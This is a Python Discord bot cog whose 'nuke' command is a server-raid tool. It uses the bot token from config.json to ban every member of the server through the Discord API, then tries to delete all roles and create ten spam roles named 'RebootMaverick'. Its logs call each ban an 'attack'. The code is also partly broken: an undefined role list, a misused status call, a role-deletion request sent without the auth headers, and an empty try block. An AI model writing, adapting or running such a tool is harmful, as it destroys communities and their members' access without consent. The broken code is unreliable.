import discord
from discord import app_commands
from discord.ext import commands
import requests as nuke
import json
import logging
from rich.logging import RichHandler

class NukeClass(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_ready(self):
        await self.bot.tree.sync()

    @commands.command()
    async def nuke(self, ctx):
        try:
            logging.basicConfig(
                level=logging.INFO, 
                format="%(message)s",
                datefmt="[%X]",
                handlers=[RichHandler()],
            )
            
            guild_id = ctx.guild.id
            guild = self.bot.get_guild(guild_id)
            
            member_ids = [member.id for member in guild.members]
            
            with open('config.json') as f:
                data = json.load(f)
            bot_token = data['Token']
            
            headers = {'Authorization': f'Bot {bot_token}'}
            
            for member_id in member_ids:
                response = nuke.put(f'https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}', headers=headers)
                if response.status_code == 204:
                    logging.info(f"対象の攻撃に成功しました。: {member_id}")
                elif response.status_code == 403:
                    logging.error(f"対象の攻撃に失敗しました。: {member_id}")
        
        except Exception as e:
            pass
        try:
            for role in guild.roles:
                role_ids.append(role.id)
            for role_id in role_ids:
                nuke.delete(f'https://canary.discord.com/api/v9/guilds/{guild_id}/roles/{role_id}')
                print(nuke.status_code)
        except Exception as e:
            pass
        try:
            for i in range(10):
                payload = {'name': 'RebootMaverick'}
                response = nuke.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers,json=payload)
        
        except Exception as e:
            pass
        try:
            
        except Exception as e:
            pass

            
async def setup(bot):
    await bot.add_cog(NukeClass(bot))
